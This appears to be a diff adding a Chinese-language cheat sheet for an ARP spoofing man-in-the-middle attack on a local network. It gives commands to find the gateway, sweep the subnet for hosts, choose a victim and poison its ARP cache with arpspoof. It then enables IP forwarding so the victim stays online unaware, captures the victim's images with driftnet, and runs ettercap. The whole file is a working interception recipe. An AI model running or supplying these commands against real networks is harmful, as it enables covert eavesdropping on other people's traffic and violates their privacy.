@@ -1,0 +1,48 @@
+ifconfig 
+# 查看网卡名称为 mlan0  本机ip地址为 172.27.35.8
+ 
+netstat -rn 或者 route -n 或者nslookup > nslookup 172.27.35.8  
+# 查看网关为172.27.35.1
+
+fping -asg 172.27.35.0/24
+# 查看局域网其他ip 
+
+# 确定攻击对象 172.27.35.3
+
+arpspoof -i mlan0 -t 172.27.35.3 172.27.35.1
+# 开始arp攻击
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+# 修改ip_forward文件，写入1(网络重启后，会自动关闭，每次需要用的时候都要重新开始)
+# 这样的话，不会显示断网，形成arp欺骗
+# 攻击目标 >> 我的网卡 >> 网关 (开启ip转发)
+
+driftnet -i mlan0
+# 查看我的网卡
+
+
+driftnet主要参数
+
+-b  捕获到新的图片时发出嘟嘟声
+
+-i  interface     选择监听接口
+
+-f  file   读取一个指定pcap数据包中的图片
+
+-p  不让所监听的接口使用混杂模式
+
+-a  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）
+
+-m  number 指定保存图片数的数目
+
+-d  directory  指定保存图片的路径
+
+-x  prefix  指定保存图片的前缀名
+
+driftnet -i wlan0   实时监听
+
+ettercap -Tq -i mlan0
+# 
+
+
+
